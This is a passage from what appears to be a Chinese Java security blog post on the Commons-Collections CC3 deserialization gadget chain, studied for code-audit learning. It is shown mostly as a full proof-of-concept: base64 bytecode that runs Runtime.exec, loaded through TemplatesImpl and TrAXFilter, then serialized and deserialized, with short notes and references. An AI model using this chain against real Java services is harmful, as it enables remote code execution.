class="hljs-string">&quot;TGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3Jn&quot;</span> +<br>                <span class="hljs-string">&quot;L2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBh&quot;</span> +<br>                <span class="hljs-string">&quot;Y2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRl&quot;</span> +<br>                <span class="hljs-string">&quot;cmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJh&quot;</span> +<br>                <span class="hljs-string">&quot;dG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxp&quot;</span> +<br>                <span class="hljs-string">&quot;emVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylW&quot;</span> +<br>                <span class="hljs-string">&quot;AQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAY8aW5pdD4BAAMoKVYHACoBAApTb3VyY2VG&quot;</span> +<br>                <span class="hljs-string">&quot;aWxlAQAMUGF5bG9hZC5qYXZhDAAdAB4HACsMACwALQEAEGdub21lLWNhbGN1bGF0b3IMAC4ALwEA&quot;</span> +<br>                <span class="hljs-string">&quot;E29yZy9sY2RtMTIzL1BheWxvYWQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwv&quot;</span> +<br>                <span class="hljs-string">&quot;eHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFu&quot;</span> +<br>                <span class="hljs-string">&quot;L2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9pby9JT0V4Y2VwdGlvbgEA&quot;</span> +<br>                <span class="hljs-string">&quot;EWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEA&quot;</span> +<br>                <span class="hljs-string">&quot;BGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAA&quot;</span> +<br>                <span class="hljs-string">&quot;AAQAAQAHAAgAAgAJAAAAPwAAAAMAAAABsQAAAAIACgAAAAYAAQAAAA8ACwAAACAAAwAAAAEADAAN&quot;</span> +<br>                <span class="hljs-string">&quot;AAAAAAABAA4ADwABAAAAAQAQABEAAgASAAAABAABABMAAQAHABQAAgAJAAAASQAAAAQAAAABsQAA&quot;</span> +<br>                <span class="hljs-string">&quot;AAIACgAAAAYAAQAAABQACwAAACoABAAAAAEADAANAAAAAAABAA4ADwABAAAAAQAVABYAAgAAAAEA&quot;</span> +<br>                <span class="hljs-string">&quot;FwAYAAMAEgAAAAQAAQATAAkAGQAaAAEACQAAACsAAAABAAAAAbEAAAACAAoAAAAGAAEAAAAYAAsA&quot;</span> +<br>                <span class="hljs-string">&quot;AAAMAAEAAAABABsAHAAAAAEAHQAeAAIACQAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgAK&quot;</span> +<br>                <span class="hljs-string">&quot;AAAADgADAAAAGQAEABoADQAbAAsAAAAMAAEAAAAOAAwADQAAABIAAAAEAAEAHwABACAAAAACACE=&quot;</span>);<br>        TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;bytes&#125;);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;lcdm123&quot;</span>);<br>        <span class="hljs-comment">//setFieldValue(templates,&quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><br>        Transformer[] faketransformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)&#125;;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(TrAXFilter.class),<br>                <span class="hljs-keyword">new</span> InstantiateTransformer(<span class="hljs-keyword">new</span> Class[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;templates&#125;)<br>        &#125;;<br>        HashMap inerMap = <span class="hljs-keyword">new</span> HashMap();<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(faketransformers);<br>        Map outerMap = LazyMap.decorate(inerMap, chainedTransformer);<br><br>        HashMap&lt;TiedMapEntry,String&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(outerMap,<span class="hljs-string">&quot;lcdm123&quot;</span>);<br>        hashMap.put(tiedMapEntry,<span class="hljs-string">&quot;test123&quot;</span>);<br>        outerMap.remove(<span class="hljs-string">&quot;lcdm123&quot;</span>);<br><br>        setFieldValue(chainedTransformer,<span class="hljs-string">&quot;iTransformers&quot;</span>,transformers);<br><br>        <span class="hljs-comment">// 序列化</span><br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        objectOutputStream.writeObject(hashMap);<br>        objectOutputStream.close();<br><br>        <span class="hljs-comment">// 反序列化</span><br>        ByteArrayInputStream byteArrayInputStream = <span class="hljs-keyword">new</span> ByteArrayInputStream(byteArrayOutputStream.toByteArray());<br>        ObjectInputStream objectInputStream = <span class="hljs-keyword">new</span> ObjectInputStream(byteArrayInputStream);<br>        objectInputStream.readObject();<br>        objectInputStream.close();<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;<br>        Field field = obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211111204553382.png" srcset="/img/loading.gif" lazyload alt="image-20211111204553382"></p>
+<p>在上面的代码中可以不用使用<code>_tfactiry</code>，因为它是瞬态的属性本身没法序列化，所以 POC 中不使用它也不会有影响</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211111212011740.png" srcset="/img/loading.gif" lazyload alt="image-20211111212011740"></p>
+<p>在反序列化时它重写的<code>readobject()</code>方法会自动初始化改变量</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211111212150797.png" srcset="/img/loading.gif" lazyload alt="image-20211111212150797"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>感觉CC链越往后面，这些链子的相关性就越大，学起来就越容易。好好学习，天天向上。</p>
+<p>参考文章</p>
+<p>P神代码审计</p>
+<p><a target="_blank" rel="noopener" href="https://ego00.blog.csdn.net/article/details/119780324">https://ego00.blog.csdn.net/article/details/119780324</a></p>
+<p><a target="_blank" rel="noopener" href="https://su18.org/post/ysoserial-su18-2/#commonscollections3">https://su18.org/post/ysoserial-su18-2/#commonscollections3</a></p>
+<p><a target="_blank" rel="noopener" href="https://y4tacker.blog.csdn.net/article/details/119084222">https://y4tacker.blog.csdn.net/article/details/119084222</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.guildhab.top/2020/09/java-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e9-%e8%a7%a3%e5%af%86-ysoserial-commonscollections3-pop-chains/">https://www.guildhab.top/2020/09/java-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e9-%e8%a7%a3%e5%af%86-ysoserial-commonscollections3-pop-chains/</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/Web/">Web</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Java/">Java</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/11/16/Shiro-550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%B8%80/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Shiro 550 反序列化(一)</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/11/11/Java-CC6/">
+                        <span class="hidden-mobile">Java CC6</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
